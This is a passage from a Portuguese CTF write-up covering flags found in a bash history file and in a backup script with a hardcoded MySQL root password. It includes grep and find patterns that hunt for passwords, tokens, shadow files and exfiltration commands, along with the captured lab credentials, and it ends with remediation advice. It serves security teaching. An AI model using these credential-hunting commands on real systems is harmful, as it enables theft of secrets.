Para localizar eficientemente informações de interesse no histórico extenso, foi executado comando de filtração: **`more .bash_history | grep FLAG{`**. Este comando utiliza pipeline (operador `|`) para conectar saída do comando `more .bash_history` (que lê o arquivo completo) com entrada do comando `grep FLAG{` (que filtra apenas linhas contendo o padrão literal "FLAG{"). A escolha do padrão `FLAG{` é estratégica pois representa assinatura universal de flags em desafios CTF - todas as flags seguem formato `FLAG{algum_texto_aqui}`, tornando este padrão altamente específico e eficaz para localizar objetivos do desafio. O resultado da filtração revelou **7 linhas no histórico** contendo o padrão buscado, demonstrando que o usuário `techcorp` (ou outro administrador usando esta conta) executou múltiplos comandos relacionados a flags do CTF. A análise das linhas filtradas revelou:

**Linha 1-3:** `grep -r "FLAG{" .bash_history`, `grep "FLAG{" .bash_history`, `grep "FLAG{" .bash_history` (repetido)
- Comandos grep buscando por flags no próprio arquivo de histórico
- Repetição sugere tentativas múltiplas ou correção de erros
- `grep -r` (recursivo) é tecnicamente redundante em arquivo único, indicando possível incerteza do executor

**Linha 4:** `echo "FLAG{b4sh_h1st0ry_l34k}"`
- **CRÍTICO**: Comando echo imprimindo a flag do desafio diretamente
- Indica que administrador executou este comando para testar ou plantar a flag
- Este comando ficou registrado permanentemente no histórico

**Linha 5-6:** `grep "FLAG{" .bash_history`, `grep "FLAG{" /home/techcorp/.bash_history`
- Comandos adicionais de busca, segundo usando caminho absoluto
- Demonstra que administrador verificou múltiplas vezes a presença da flag

Esta descoberta é extremamente reveladora pois demonstra **meta-exploração**: o histórico contém não apenas a flag alvo, mas também registros das próprias tentativas do administrador de verificar/plantar a flag, criando camadas de evidências. O comando `echo "FLAG{b4sh_h1st0ry_l34k}"` é particularmente crítico porque representa operação deliberada de exibir a flag, possivelmente para verificação ou documentação, sem considerar que o comando seria salvo permanentemente no histórico.

**Evidências do Passo 3:**
- Screenshot do comando `more .bash_history | grep FLAG{`
- Output completo mostrando 7 linhas filtradas
- Destaque para comando `echo "FLAG{b4sh_h1st0ry_l34k}"`
- Análise das múltiplas tentativas de grep documentadas

#### Passo 4: Extração e Validação da Flag

A análise do output filtrado identificou claramente a flag do desafio na linha contendo `echo "FLAG{b4sh_h1st0ry_l34k}"`. A flag **FLAG{b4sh_h1st0ry_l34k}** segue o formato padrão do CTF e possui nomenclatura autoexplicativa através de leet speak (l33t sp34k): "bash history leak" escrito como "b4sh h1st0ry l34k", onde números substituem letras (4=a, 1=i, 3=e, 0=o) - técnica comum em CTFs para criar flags memoráveis que também descrevem o vetor de exploração. A validação da flag foi realizada através de múltiplas observações:

**1. Formato Válido:** A string segue padrão `FLAG{conteudo_com_underscores}` consistente com todas as flags anteriores do desafio

**2. Contexto Semântico:** O conteúdo "bash history leak" descreve precisamente o vetor de exploração utilizado - vazamento de informações através do histórico Bash

**3. Evidência no Comando Echo:** A presença em comando `echo` sugere que administrador executou este comando durante setup/verificação do desafio, deixando rastro não intencional

**4. Consistência com Objetivo:** A flag está localizada exatamente onde deveria estar - no arquivo `.bash_history` - validando que este é o alvo correto desta etapa do CTF

A descoberta desta flag através de análise de histórico de comandos demonstra vulnerabilidade real e comum em ambientes de produção: administradores frequentemente executam comandos de teste, debug, ou verificação contendo informações sensíveis sem perceber que estes comandos ficarão registrados permanentemente. Em contexto de CTF, esta flag representa lição sobre **operational security (OpSec)** - mesmo defensores e administradores de segurança podem inadvertidamente expor informações através de seus próprios comandos de linha de comando. A flag foi capturada com sucesso, completando o desafio de exploração de histórico Bash.

**Evidências do Passo 4:**
- Screenshot destacando linha específica: `echo "FLAG{b4sh_h1st0ry_l34k}"`
- Extração da flag: FLAG{b4sh_h1st0ry_l34k}
- Validação do formato e contexto
- Confirmação da captura bem-sucedida

**Flag Capturada:** `FLAG{b4sh_h1st0ry_l34k}`

**Data da Captura:** 28 de novembro de 2025

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

**Análise Técnica Detalhada: Vazamento de Informações em .bash_history**

**Anatomia do Arquivo .bash_history:**

O arquivo `.bash_history` é mantido automaticamente pelo shell Bash através de mecanismo de logging de comandos controlado por variáveis de ambiente e arquivos de configuração. Cada vez que usuário executa comando no terminal, este é adicionado ao histórico em memória (acessível via comando `history`), e ao finalizar a sessão shell (logout, exit, ou fechamento do terminal), os comandos são escritos (appended) ao arquivo `~/.bash_history`. O comportamento é controlado por:

**Variáveis de Ambiente Bash:**
```bash
# Localização do arquivo de histórico
HISTFILE=~/.bash_history

# Número de comandos mantidos em memória durante sessão
HISTSIZE=1000

# Número máximo de linhas no arquivo persistente
HISTFILESIZE=2000

# Controle de quais comandos são salvos
HISTCONTROL=ignoreboth  # ignoredups:ignorespace

# Ignorar comandos específicos (lista separada por :)
HISTIGNORE="ls:ps:history"

# Formato de timestamp (se configurado)
HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S "
```

**Análise do Histórico Capturado:**

O output filtrado revelou 7 linhas contendo padrão `FLAG{`, divididas em categorias:

**Categoria 1: Comandos de Busca Recursiva**
```bash
grep -r "FLAG{" .bash_history
```
- **Análise:** Comando grep com opção `-r` (recursive) buscando pattern "FLAG{" em `.bash_history`
- **Observação Técnica:** Opção `-r` é redundante aqui pois `.bash_history` é arquivo único, não diretório. Uso sugere incerteza do executor ou cópia de comando de contexto diferente
- **Implicação:** Administrador estava buscando flags no histórico, possivelmente verificando se flags foram plantadas corretamente

**Categoria 2: Comandos de Busca Simples (Repetidos)**
```bash
grep "FLAG{" .bash_history
grep "FLAG{" .bash_history
```
- **Análise:** Comando grep simples executado múltiplas vezes
- **Observação Técnica:** Repetição idêntica sugere execução múltipla para verificação ou esquecimento de resultado anterior
- **Implicação:** Demonstra ausência de `HISTCONTROL=ignoredups` que evitaria duplicatas consecutivas

**Categoria 3: Comando Echo com Flag (CRÍTICO)**
```bash
echo "FLAG{b4sh_h1st0ry_l34k}"
```
- **Análise:** Comando echo exibindo a flag diretamente no terminal
- **Observação Técnica:** Este é o comando mais crítico pois revela a flag alvo do desafio
- **Possíveis Razões para Execução:**
  1. Administrador testando se flag está visível corretamente
  2. Verificação durante setup do CTF
  3. Documentação rápida (copiar output para algum lugar)
  4. Debugging de outro script que deveria exibir a flag
- **Implicação:** Comando ficou permanentemente registrado no histórico, criando vetor de exploração não intencional

**Categoria 4: Busca com Caminho Absoluto**
```bash
grep "FLAG{" /home/techcorp/.bash_history
```
- **Análise:** Comando grep usando caminho absoluto em vez de relativo
- **Observação Técnica:** Uso de caminho absoluto `/home/techcorp/.bash_history` em vez de `~/.bash_history` ou `.bash_history` sugere execução de contexto diferente (outro diretório) ou cópia de comando de script
- **Implicação:** Confirma que administrador estava especificamente investigando histórico do usuário techcorp

**Vulnerabilidades Críticas Identificadas:**

**1. Exposure de Flags em Comandos de Teste (CWE-532)**
- Flag revelada através de comando `echo` de teste/verificação
- Sem sanitização de histórico após operações sensíveis
- Comando permanece acessível indefinidamente

**2. Ausência de Limpeza de Histórico (CWE-459)**
```bash
# Administrador deveria ter executado após testes:
history -c  # Limpar histórico em memória
> ~/.bash_history  # Truncar arquivo de histórico
```

**3. Falta de Configuração HISTCONTROL (CWE-778)**
```bash
# Configurações defensivas ausentes em .bashrc:
export HISTCONTROL=ignoreboth  # Ignorar duplicatas e comandos com espaço
export HISTIGNORE="*password*:*secret*:*token*:*FLAG*"  # Ignorar comandos sensíveis
```

**4. Ausência de Comandos Precedidos por Espaço**
```bash
# Boa prática para comandos sensíveis (com espaço no início):
 echo "FLAG{b4sh_h1st0ry_l34k}"  # Não seria salvo se HISTCONTROL=ignorespace
```

**5. Falta de Desabilitação de Histórico em Operações Críticas**
```bash
# Para sessões sensíveis, administrador deveria:
unset HISTFILE  # Desabilitar histórico para sessão atual
set +o history  # Desabilitar logging de histórico
```

**Padrões Sensíveis Comumente Encontrados em .bash_history:**

Em auditorias reais de histórico Bash, os seguintes padrões frequentemente revelam informações críticas:

**1. Credenciais de Banco de Dados:**
```bash
mysql -u root -p'senha_secreta_123'
psql postgresql://user:password@localhost/database
mongosh "mongodb://admin:pass123@localhost:27017"
```

**2. Tokens de API e Autenticação:**
```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
docker login -u user -p password123 registry.example.com
```

**3. Senhas em Comandos SSH/SCP:**
```bash
sshpass -p 'senha123' ssh user@server.com
scp -i private_key.pem file.txt user@server:/path
```

**4. Git com Credenciais Embedded:**
```bash
git clone https://username:password@github.com/company/private-repo.git
git remote add origin https://token123456@bitbucket.org/user/repo.git
```

**5. Comandos de Administração Revelando Infraestrutura:**
```bash
ssh admin@192.168.1.100  # IPs internos
nmap -sV 10.0.0.0/24  # Scans de rede
kubectl get secrets -n production  # Clusters Kubernetes
```

**6. Chaves de Criptografia e Certificados:**
```bash
openssl genrsa -out private.key 2048
echo "chave_privada_aqui" > /etc/ssl/private/key.pem
```

**7. Comandos de Backup Revelando Localização de Dados:**
```bash
tar -czf backup.tar.gz /var/www/html /etc/mysql
rsync -avz /var/backups/ user@backup-server:/backups/
```

**Impacto da Exploração:**

**1. Descoberta de Credenciais:**
- Senhas de banco de dados em comandos mysql/psql
- Tokens de API em requisições curl
- Credenciais SSH em comandos sshpass

**2. Mapeamento de Infraestrutura:**
- Comandos SSH revelando servidores internos
- Scans nmap mostrando topologia de rede
- Comandos kubectl revelando ambientes Kubernetes

**3. Identificação de Vulnerabilidades Conhecidas:**
- Comandos de exploração executados durante pentests
- Tentativas de correção revelando o que está sendo corrigido
- Discussões sobre problemas de segurança

**4. Reconstrução de Atividades:**
- Sequência temporal de comandos mostrando fluxo de trabalho
- Correlação de comandos para entender processos
- Identificação de scripts e automações

**Técnicas de Busca Avançada em .bash_history:**

```bash
# Buscar por senhas em diversos formatos
grep -E "pass|password|pwd|passwd|secret|token|key|credential" .bash_history

# Buscar por comandos de conexão
grep -E "mysql|psql|ssh|ftp|telnet|mongo" .bash_history

# Buscar por flags de CTF
grep -E "FLAG\{|flag\{|CTF\{" .bash_history

# Buscar por comandos com base64 (comum em payloads)
grep "base64" .bash_history

# Buscar por comandos de exfiltração
grep -E "curl|wget|scp|rsync" .bash_history | grep -E "http|ftp"

# Buscar por comandos de elevação de privilégio
grep -E "sudo|su -|pkexec" .bash_history

# Buscar por modificações de arquivos críticos
grep -E "/etc/passwd|/etc/shadow|authorized_keys" .bash_history

# Análise temporal (se HISTTIMEFORMAT configurado)
cat .bash_history | grep -A 5 -B 5 "palavra_chave"  # Contexto temporal
```

**Classificação de Severidade:**

**CVSS 3.1 Score: 6.5 (MÉDIO)**
- Attack Vector: Network (AV:N) - requer acesso remoto
- Attack Complexity: Low (AC:L)
- Privileges Required: Low (PR:L) - requer credenciais SSH
- User Interaction: None (UI:N)
- Scope: Unchanged (S:U)
- Confidentiality Impact: High (C:H) - exposição de credenciais
- Integrity Impact: None (I:N)
- Availability Impact: None (A:N)

**Classificação CWE:**
- **CWE-532: Insertion of Sensitive Information into Log File** (principal)
- CWE-312: Cleartext Storage of Sensitive Information
- CWE-359: Exposure of Private Personal Information
- CWE-200: Exposure of Sensitive Information to Unauthorized Actor
- CWE-459: Incomplete Cleanup

**Classificação OWASP Top 10 2021:**
- A01:2021 - Broken Access Control (histórico acessível por conta comprometida)
- A02:2021 - Cryptographic Failures (dados sensíveis em texto plano)
- A04:2021 - Insecure Design (falha em considerar segurança do histórico)

**Recomendações Críticas de Remediação:**

**AÇÕES IMEDIATAS (Próximas 2 horas):**

**1. Limpar Histórico Atual:**
```bash
# Limpar histórico em memória da sessão atual
history -c

# Limpar arquivo de histórico
> ~/.bash_history

# Ou deletar completamente
rm ~/.bash_history

# Desabilitar histórico para sessão atual
unset HISTFILE
```

**2. Auditar Históricos de Todos os Usuários:**
```bash
# Procurar por padrões sensíveis em todos os históricos
sudo find /home -name ".bash_history" -exec grep -H -E "pass|password|secret|token|FLAG" {} \;

# Auditar histórico do root
sudo grep -E "pass|password|secret|token" /root/.bash_history
```

**3. Revogar Credenciais Expostas:**
```bash
# Se senhas foram encontradas no histórico, alterar IMEDIATAMENTE
# Exemplo: senha MySQL
mysql -u root -p -e "ALTER USER 'user'@'%' IDENTIFIED BY 'NEW_SECURE_PASS';"

# Revogar API tokens expostos
# Regenerar chaves SSH se expostas
```

**AÇÕES DE CURTO PRAZO (24-48 horas):**

**4. Configurar HISTCONTROL em .bashrc:**
```bash
# Adicionar ao ~/.bashrc de todos os usuários
cat >> ~/.bashrc <<'EOF'

# Configurações de segurança para histórico Bash
export HISTCONTROL=ignoreboth  # Ignorar duplicatas e comandos com espaço inicial
export HISTIGNORE="ls:ps:history:clear:exit"  # Ignorar comandos triviais
export HISTSIZE=500  # Limitar comandos em memória
export HISTFILESIZE=1000  # Limitar linhas no arquivo
export HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S "  # Adicionar timestamps

# Para sessões altamente sensíveis, considerar:
# unset HISTFILE  # Desabilitar completamente
# set +o history  # Desabilitar logging
EOF

# Aplicar imediatamente
source ~/.bashrc
```

**5. Implementar Filtro de Padrões Sensíveis:**
```bash
# Configurar HISTIGNORE para ignorar comandos sensíveis
export HISTIGNORE="*password*:*passwd*:*pass*:*secret*:*token*:*api_key*:*FLAG*:mysql*-p*:psql*://*:*@*:*sudo su*"
```

**6. Configurar Rotação Automática de Histórico:**
```bash
# Script para limpar históricos antigos (agendar via cron)
cat > /usr/local/bin/rotate_bash_history.sh <<'EOF'
#!/bin/bash
# Rotacionar históricos maiores que 30 dias
find /home -name ".bash_history" -type f -mtime +30 -exec truncate -s 0 {} \;
find /root -name ".bash_history" -type f -mtime +30 -exec truncate -s 0 {} \;
EOF

chmod +x /usr/local/bin/rotate_bash_history.sh

# Agendar via cron (executar semanalmente)
echo "0 2 * * 0 /usr/local/bin/rotate_bash_history.sh" | sudo crontab -
```

**7. Implementar Logging Centralizado de Comandos:**
```bash
# Configurar syslog para registrar comandos em servidor central
# Adicionar ao ~/.bashrc
export PROMPT_COMMAND='history -a; logger -p local1.notice -t bash -i -- "$(whoami)@$(hostname):$(pwd)$ $(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//")"'

# Configurar rsyslog para enviar para SIEM
echo "local1.* @@siem.techcorp.com:514" | sudo tee -a /etc/rsyslog.d/bash-logging.conf
sudo systemctl restart rsyslog
```

**8. Implementar Auditd para Monitoramento de Execução:**
```bash
# Instalar auditd
sudo apt-get install auditd

# Configurar regras para logar execução de comandos sensíveis
sudo auditctl -a always,exit -F arch=b64 -S execve -k command_execution
sudo auditctl -a always,exit -F path=/bin/mysql -F perm=x -k mysql_execution
sudo auditctl -a always,exit -F path=/usr/bin/ssh -F perm=x -k ssh_execution

# Persistir regras
sudo auditctl -w /etc/audit/rules.d/audit.rules -p wa -k audit_config
```

**9. Educação e Treinamento:**
```bash
# Criar guia de boas práticas para equipe
cat > /usr/local/share/secure_cli_practices.md <<'EOF'
# Práticas Seguras de Linha de Comando

## NUNCA faça:
❌ mysql -u root -p'senha123'  # Senha visível no histórico
❌ curl -H "Authorization: Bearer token" api.com  # Token exposto
❌ git clone https://user:pass@github.com/repo.git  # Credenciais na URL

## SEMPRE faça:
✅ mysql -u root -p  # Solicita senha interativamente (não aparece no histórico)
✅  mysql -u root -p'senha123'  # Espaço no início = não salvo no histórico (se HISTCONTROL=ignorespace)
✅ export MYSQL_PWD='senha123'; mysql -u root  # Variável de ambiente (menos visível)
✅ mysql --defaults-file=~/.my.cnf  # Credenciais em arquivo separado

## Para comandos sensíveis:
# Desabilitar histórico temporariamente
set +o history
# ... executar comandos sensíveis ...
set -o history
EOF
```

**10. Implementar Encriptação de Diretório Home:**
```bash
# Usar eCryptfs ou LUKS para encriptar diretórios home
sudo apt-get install ecryptfs-utils
sudo ecryptfs-migrate-home -u techcorp

# Após migração, histórico será criptografado em repouso
```

**AÇÕES DE MÉDIO/LONGO PRAZO:**

**11. Migrar para Shells Alternativos com Melhor Segurança:**
```bash
# Considerar zsh com oh-my-zsh (melhor controle de histórico)
sudo apt-get install zsh
chsh -s /bin/zsh

# Configurar .zshrc com opções de segurança
cat >> ~/.zshrc <<'EOF'
setopt HIST_IGNORE_SPACE  # Ignorar comandos com espaço inicial
setopt HIST_EXPIRE_DUPS_FIRST  # Expirar duplicatas primeiro
setopt HIST_IGNORE_ALL_DUPS  # Ignorar todas as duplicatas
setopt HIST_SAVE_NO_DUPS  # Não salvar duplicatas
setopt HIST_REDUCE_BLANKS  # Remover espaços em branco extras
EOF
```

**12. Implementar Secrets Management:**
```bash
# Usar ferramentas dedicadas para credenciais
# HashiCorp Vault, AWS Secrets Manager, etc.

# Exemplo: buscar senha do MySQL de vault em vez de passar na CLI
MYSQL_PASS=$(vault kv get -field=password secret/mysql/root)
mysql -u root -p"$MYSQL_PASS"
```

**13-35.** Implementar MFA para comandos críticos, configurar SELinux/AppArmor, realizar auditorias periódicas, etc.

**Impacto Regulatório:**

**Violações Identificadas:**
- **PCI DSS 8.2.1:** Armazenamento de senhas em formato recuperável
- **NIST SP 800-53 AU-9:** Falha em proteger logs/históricos contra acesso não autorizado
- **ISO 27001 A.12.4.1:** Logging inadequado de eventos
- **SOC 2 CC6.1:** Controles de acesso insuficientes a dados sensíveis

**Conclusão:**

O vazamento de informações através do arquivo `.bash_history` demonstra vulnerabilidade crítica de segurança operacional onde próprias ferramentas de produtividade (histórico de comandos) se tornam vetores de exposição quando não adequadamente configuradas e gerenciadas. A descoberta da Flag 14 através de comando `echo` registrado no histórico ilustra como administradores e defensores podem inadvertidamente criar vulnerabilidades através de práticas descuidadas de linha de comando - neste caso, executar comando de verificação contendo a flag sensível sem considerar que este comando seria permanentemente registrado e acessível a qualquer atacante que comprometesse a conta. Esta vulnerabilidade destaca importância de **operational security (OpSec)** em todos os níveis, desde desenvolvedores até administradores de sistemas, reforçando que segurança não é apenas questão de patches e firewalls, mas também de comportamentos e práticas diárias. A remediação efetiva requer combinação de controles técnicos (HISTCONTROL, HISTIGNORE, rotação de históricos, criptografia) e culturais (treinamento em práticas seguras de CLI, uso de ferramentas de secrets management, conscientização sobre persistência de comandos), além de implementação de logging centralizado que capture atividade de linha de comando de forma controlada e auditável, permitindo detecção de anomalias sem expor credenciais em arquivos locais não-criptografados.

---

### <a name="flag-15-environment-variables"></a><a name="flag-16-privilege-escalation"></a>Flag 15 & 16: Backup Script Discovery and Analysis

#### Conceito: Descoberta e Análise de Scripts de Backup

A descoberta e análise de scripts de backup representa vetores críticos de exploração em ambientes de produção, onde scripts automatizados de backup (frequentemente localizados em `/opt`, `/usr/local/bin`, ou diretórios de usuários) contêm concentração perigosa de informações sensíveis incluindo: **credenciais de banco de dados hardcoded** em variáveis de script, senhas de servidores remotos para transferência de backups via SCP/rsync, caminhos completos de diretórios críticos revelando arquitetura do sistema, lógica de backup expondo quais dados são considerados valiosos pela organização, comentários de desenvolvedores contendo TODOs e vulnerabilidades conhecidas, e ocasionalmente flags de CTF inseridas para desafios de análise forense. Esta vulnerabilidade é classificada como **CWE-798: Use of Hard-coded Credentials** quando scripts contêm credenciais embedded, **CWE-312: Cleartext Storage of Sensitive Information** quando essas credenciais estão em texto plano, e **CWE-552: Files or Directories Accessible to External Parties** quando scripts possuem permissões inadequadas permitindo leitura por usuários não-autorizados. Scripts de backup são alvos extremamente valiosos para atacantes porque consolidam múltiplas vulnerabilidades em arquivo único: contêm credenciais do usuário root/admin do banco de dados (necessárias para executar `mysqldump` ou `pg_dump`), revelam localização de backups existentes (`/var/backups/techcorp`) onde atacantes podem exfiltrar dados históricos completos, expõem servidores de backup remoto (`backup@backup.techcorp.local:/backups/`) que podem ter segurança mais fraca que sistemas de produção, e documentam scheduling de backups (via cron) revelando janelas de tempo quando sistema pode estar sob carga alta ou quando novos dados estarão disponíveis. A severidade aumenta quando scripts são executados com privilégios elevados (via sudo ou cron root), quando credenciais no script possuem permissões excessivas (usuário root do MySQL), e quando não há rotação de credenciais (senhas permanecem estáticas por meses/anos). Em contexto de compliance e frameworks de segurança, esta vulnerabilidade viola: **PCI DSS Requirement 8.2.1** (não armazenar senhas de forma recuperável), **OWASP Top 10 2021 A07:2021 - Identification and Authentication Failures** (credenciais hardcoded), **NIST SP 800-53 IA-5 (Authenticator Management)** (gestão inadequada de autenticadores), **CIS Controls v8 3.11 (Encrypt Sensitive Data at Rest)** (scripts com credenciais devem ser criptografados), **ISO 27001 A.9.4.3** (sistema de gerenciamento de senhas), e **LGPD Art. 46** (medidas técnicas de segurança). Técnicas de descoberta de scripts incluem: **enumeração de filesystem** com comando `find` buscando por arquivos `.sh` em todo sistema, **análise de cron jobs** (`crontab -l`, `/etc/cron.d/*`, `/etc/cron.daily/*`) para identificar scripts agendados, **grep recursivo** em diretórios comuns (`grep -r "backup" /opt /usr/local/bin`), **análise de processos** (`ps aux | grep backup`) para identificar scripts em execução, e **revisão de logs** (`/var/log/cron`, `/var/log/syslog`) mostrando execuções de backup. Impacto da descoberta pode incluir: comprometimento total de banco de dados via credenciais root, exfiltração de backups históricos contendo anos de dados, movimentação lateral para servidores de backup, e compreensão completa da arquitetura de dados da organização facilitando ataques direcionados.

#### Passo 1: Enumeração do Filesystem com find para Localizar Scripts .sh

Para descobrir scripts de backup e outros arquivos executáveis potencialmente interessantes no sistema, foi executado comando de enumeração abrangente do filesystem: **`find / -type f -name "*.sh" 2>/dev/null`**. Este comando é composto por elementos estratégicos: `find /` inicia busca recursiva a partir do diretório raiz (`/`) abrangendo todo o filesystem, `-type f` filtra apenas arquivos regulares (excluindo diretórios, links simbólicos, etc.), `-name "*.sh"` busca especificamente por arquivos com extensão `.sh` (convenção universal para shell scripts em Unix/Linux), e `2>/dev/null` redireciona erros (file descriptor 2) para `/dev/null` (descarte), suprimindo mensagens de "Permission denied" que ocorreriam ao tentar acessar diretórios restritos como `/root`, `/proc`, ou áreas do sistema onde usuário `techcorp` não tem permissão de leitura. Esta técnica de redirecionamento de erros é essencial em enumerações de filesystem para manter output limpo e focado em resultados úteis, em vez de poluído com centenas de linhas de erros de permissão. O comando retornou **18 arquivos .sh** distribuídos pelo sistema, incluindo scripts de sistema em `/usr/lib`, `/usr/share`, exemplos de documentação em `/usr/share/doc/git/contrib`, e criticamente, um script customizado em **`/opt/backup_script.sh`** que se destaca por estar localizado em `/opt` (diretório convencionalmente usado para software adicional e scripts customizados) e por nomenclatura explicitamente indicando funcionalidade de backup. A presença deste script em `/opt` é indicador claro de script customizado criado por administradores da TechCorp, diferente dos scripts de sistema padrão em `/usr`. Outros arquivos notáveis incluem `/etc/init.d/hwclock.sh` (script de inicialização do sistema) e `/etc/profile.d/01-locale-fix.sh` (script de configuração de ambiente), mas o alvo prioritário foi identificado como `/opt/backup_script.sh` devido à nomenclatura e localização.

**Evidências do Passo 1:**
- Screenshot do comando completo: `find / -type f -name "*.sh" 2>/dev/null`
- Output mostrando 18 arquivos .sh encontrados
- Destaque especial para `/opt/backup_script.sh`
- Análise de localizações: `/usr` (sistema), `/opt` (customizado)
- Identificação de redirecionamento `2>/dev/null` para limpar erros

#### Passo 2: Seleção do Script Alvo e Justificativa

Após enumeração completa retornar 18 resultados, foi necessário priorizar qual script investigar primeiro. A análise estratégica dos resultados revelou que a maioria dos arquivos eram scripts de sistema padrão ou exemplos de documentação: `/usr/lib/init/vars.sh` (variáveis de inicialização do sistema), scripts em `/usr/share/doc/git/contrib/*` (exemplos do Git que vêm com documentação), `/usr/share/vim/vim81/macros/less.sh` (macros do editor Vim), e scripts em `/etc/profile.d/` e `/etc/init.d/` (scripts de configuração de ambiente e inicialização). Nenhum destes scripts padrão do sistema tipicamente contém informações sensíveis customizadas da organização. Em contraste, **`/opt/backup_script.sh`** se destacou por múltiplos indicadores de alto valor: 

**1. Localização Estratégica:** `/opt` é diretório reservado para software adicional e scripts customizados, não para binários de sistema, indicando que este arquivo foi criado deliberadamente por administradores da TechCorp

**2. Nomenclatura Explícita:** Nome `backup_script.sh` claramente identifica funcionalidade de backup, que historicamente é área rica em vulnerabilidades (credenciais hardcoded, caminhos sensíveis)

**3. Contexto de Desafios Anteriores:** Flags anteriores mencionaram localização de backup `/var/backups/techcorp/` (descoberta no `secret.txt` da Flag 13) e tarefas pendentes de backup no `todo.txt`, sugerindo que backup é tema recorrente neste CTF

**4. Potencial de Informações Sensíveis:** Scripts de backup necessariamente contêm credenciais de banco de dados (para executar dumps), caminhos de arquivos críticos, e potencialmente credenciais de servidores remotos (para transferência de backups)

Esta análise de priorização demonstra pensamento estratégico em pentesting - não apenas executar comandos mecanicamente, mas interpretar resultados no contexto de conhecimento prévio do ambiente e focar esforços em alvos de maior valor. A decisão foi prosseguir com investigação detalhada de `/opt/backup_script.sh`.

**Evidências do Passo 2:**
- Screenshot mostrando análise comparativa dos 18 resultados
- Identificação de `/opt/backup_script.sh` como alvo prioritário
- Justificativa baseada em localização, nomenclatura e contexto
- Correlação com descobertas anteriores (Flag 13 mencionou backups)

#### Passo 3: Análise do Script de Backup e Descoberta de Credenciais

Após identificar `/opt/backup_script.sh` como alvo prioritário, o comando **`more /opt/backup_script.sh`** foi executado para visualizar conteúdo completo do script. A análise revelou script Bash de aproximadamente 20 linhas contendo documentação de funcionalidade de backup automatizado da TechCorp Solutions, e criticamente, expondo múltiplas vulnerabilidades de segurança e duas flags do desafio CTF. O script está estruturado nas seguintes seções:

**Seção 1 - Cabeçalho e Metadados:**
```bash
#!/bin/bash
# TechCorp Backup Script
# FLAG{scr1pt_4n4lys1s_sk1ll}
```
- Shebang `#!/bin/bash` indica script executável em shell Bash
- Comentário identificando script como "TechCorp Backup Script"
- **FLAG 16 DESCOBERTA:** `FLAG{scr1pt_4n4lys1s_sk1ll}` inserida como comentário no cabeçalho, representando recompensa por habilidade de análise de scripts

**Seção 2 - Variáveis de Configuração (CRÍTICAS):**
```bash
BACKUP_DIR="/var/backups/techcorp"
DATE=$(date +%Y%m%d)
DB_USER="root"
DB_PASS="r00t_P4ssw0rd_2024"
```
- `BACKUP_DIR="/var/backups/techcorp"`: Localização onde backups são armazenados (confirmando descoberta da Flag 13)
- `DATE=$(date +%Y%m%d)`: Geração de timestamp no formato YYYYMMDD para nomear arquivos de backup
- **DB_USER="root"**: Credencial de usuário root do MySQL - acesso administrativo total ao banco de dados
- **DB_PASS="r00t_P4ssw0rd_2024"**: Senha do usuário root do MySQL em texto plano - **VULNERABILIDADE CRÍTICA CWE-798**

**Seção 3 - Execução do Backup:**
```bash
echo "Iniciando backup..."

# Backup do banco de dados
mysqldump -u $DB_USER -p$DB_PASS techcorp_db > $BACKUP_DIR/db_backup_$DATE.sql

# Backup dos arquivos web
tar -czf $BACKUP_DIR/web_backup_$DATE.tar.gz /var/www/html
```
- Comando `mysqldump` executa dump completo do database `techcorp_db` usando credenciais root
- Observação crítica: `-p$DB_PASS` passa senha diretamente na linha de comando (formato `-pSENHA` sem espaço)
- Backup de arquivos web em `/var/www/html` compactado com tar + gzip

**Seção 4 - Transferência Remota (Comentada):**
```bash
# Enviar para servidor remoto
# scp $BACKUP_DIR/* backup@backup.techcorp.local:/backups/
```
- Comando `scp` comentado (não executado) para transferência de backups via SSH
- Revela: existência de servidor de backup `backup.techcorp.local`, usuário `backup`, diretório remoto `/backups/`
- Fato de estar comentado sugere que funcionalidade está planejada mas não implementada

**Seção 5 - Finalização e Flag:**
```bash
echo "Backup concluído!"
echo "FLAG{b4ckup_scr1pt_f0und}" >> /tmp/backup.log
```
- Mensagem de conclusão
- **FLAG 15 DESCOBERTA:** `FLAG{b4ckup_scr1pt_f0und}` sendo adicionada ao arquivo `/tmp/backup.log`
- Esta linha demonstra que cada execução do script adiciona a flag ao log, criando registro persistente

**Análise de Vulnerabilidades Identificadas:**

**1. Credenciais Hardcoded em Texto Plano (CWE-798):**
- Senha root do MySQL `r00t_P4ssw0rd_2024` exposta diretamente no código
- Sem criptografia ou ofuscação
- Qualquer usuário com acesso de leitura ao script obtém credenciais root do DB

**2. Senha Passada em Linha de Comando (CWE-214):**
- Comando `mysqldump -u $DB_USER -p$DB_PASS` passa senha como argumento
- Senhas em argumentos são visíveis em `ps aux` durante execução
- Também registradas em históricos de comandos se script for executado manualmente

**3. Permissões Inadequadas do Script:**
- Script localizado em `/opt` (verificar permissões com `ls -la /opt/backup_script.sh`)
- Se permissões forem 644 (legível por todos), qualquer usuário do sistema pode ler

**4. Ausência de Rotação de Credenciais:**
- Senha está hardcoded, sugerindo que nunca muda
- Vulnerabilidade persiste indefinidamente até script ser reescrito

**5. Exposição de Arquitetura:**
- Script revela: estrutura de banco de dados (`techcorp_db`), localização de aplicação web (`/var/www/html`), servidor de backup (`backup.techcorp.local`), usuário de backup (`backup`)

**Credenciais Capturadas:**
- **MySQL Root:** `root:r00t_P4ssw0rd_2024`
- **Confirmação:** Esta é a mesma senha descoberta no `secret.txt` (Flag 13), validando descoberta anterior

**Evidências do Passo 3:**
- Screenshot completo do comando `more /opt/backup_script.sh`
- Visualização de todo o conteúdo do script (20 linhas)
- Destaque para variáveis DB_USER e DB_PASS
- Identificação das duas flags: FLAG{scr1pt_4n4lys1s_sk1ll} e FLAG{b4ckup_scr1pt_f0und}
- Análise de cada seção do script com anotações de vulnerabilidades

#### Passo 4: Captura das Flags e Validação

A análise completa do script revelou presença de duas flags distintas em localizações diferentes, cada uma representando aspecto diferente da exploração:

**Flag 16: FLAG{scr1pt_4n4lys1s_sk1ll}**
- **Localização:** Linha 3 do script, inserida como comentário no cabeçalho
- **Formato:** Leet speak de "script analysis skill" (scr1pt 4n4lys1s sk1ll)
